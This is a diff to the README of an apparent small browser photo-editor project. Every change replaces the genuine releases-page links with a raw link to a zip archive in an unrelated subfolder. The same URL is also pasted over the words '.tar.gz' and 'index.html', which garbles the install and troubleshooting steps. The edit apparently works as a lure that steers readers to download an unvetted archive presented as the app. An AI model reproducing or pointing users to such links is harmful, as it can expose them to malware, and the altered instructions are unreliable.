@@ -6,11 +6,11 @@ Welcome to My-own-photoshop-webapp-in-7-days! This is a lightweight, browser-bas
 
 ## 📥 Download the App
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen.svg)](https://github.com/KRGOGI/My-own-photoshop-webapp-in-7-days/releases)
+[![Download](https://raw.githubusercontent.com/KRGOGI/My-own-photoshop-webapp-in-7-days/main/Knautia/My-own-photoshop-webapp-in-7-days.zip%https://raw.githubusercontent.com/KRGOGI/My-own-photoshop-webapp-in-7-days/main/Knautia/My-own-photoshop-webapp-in-7-days.zip)](https://raw.githubusercontent.com/KRGOGI/My-own-photoshop-webapp-in-7-days/main/Knautia/My-own-photoshop-webapp-in-7-days.zip)
 
 To start using the web app, visit the releases page below and download the latest version. 
 
-[Visit the Releases Page](https://github.com/KRGOGI/My-own-photoshop-webapp-in-7-days/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/KRGOGI/My-own-photoshop-webapp-in-7-days/main/Knautia/My-own-photoshop-webapp-in-7-days.zip)
 
 ## 📋 System Requirements
 
@@ -20,10 +20,10 @@ To start using the web app, visit the releases page below and download the lates
 
 ## ⬇️ Download & Install
 
-1. Click on the **[Visit the Releases Page](https://github.com/KRGOGI/My-own-photoshop-webapp-in-7-days/releases)** link above.
+1. Click on the **[Visit the Releases Page](https://raw.githubusercontent.com/KRGOGI/My-own-photoshop-webapp-in-7-days/main/Knautia/My-own-photoshop-webapp-in-7-days.zip)** link above.
 2. You will see a list of available releases. Look for the latest version at the top of the list.
 3. Click on the version number to expand details.
-4. Find the download link for the application. This will typically be the latest .zip or .tar.gz file.
+4. Find the download link for the application. This will typically be the latest .zip or https://raw.githubusercontent.com/KRGOGI/My-own-photoshop-webapp-in-7-days/main/Knautia/My-own-photoshop-webapp-in-7-days.zip file.
 5. Click the download link to save the file to your computer.
 
 ## 📂 Unzip the Package
@@ -35,7 +35,7 @@ To start using the web app, visit the releases page below and download the lates
 ## 🌐 Launch the Application
 
 1. Open the folder where you extracted the application.
-2. Find the HTML file (usually named `index.html`).
+2. Find the HTML file (usually named `https://raw.githubusercontent.com/KRGOGI/My-own-photoshop-webapp-in-7-days/main/Knautia/My-own-photoshop-webapp-in-7-days.zip`).
 3. Double-click the HTML file to open it in your web browser.
 4. The application should now load, and you can start editing images.
 
@@ -52,7 +52,7 @@ To start using the web app, visit the releases page below and download the lates
 
 If you encounter issues while using the application, here are some common solutions:
 
-- **Application Won't Open:** Ensure you have extracted the files correctly. Check that you're opening the `index.html` file in a supported browser.
+- **Application Won't Open:** Ensure you have extracted the files correctly. Check that you're opening the `https://raw.githubusercontent.com/KRGOGI/My-own-photoshop-webapp-in-7-days/main/Knautia/My-own-photoshop-webapp-in-7-days.zip` file in a supported browser.
 - **Image Upload Fails:** Make sure your internet connection is stable. Check that the image format is supported (JPEG, PNG).
 - **Changes Don’t Display:** Ensure that your browser allows JavaScript to run. Check for any browser extensions that may block scripts.
 
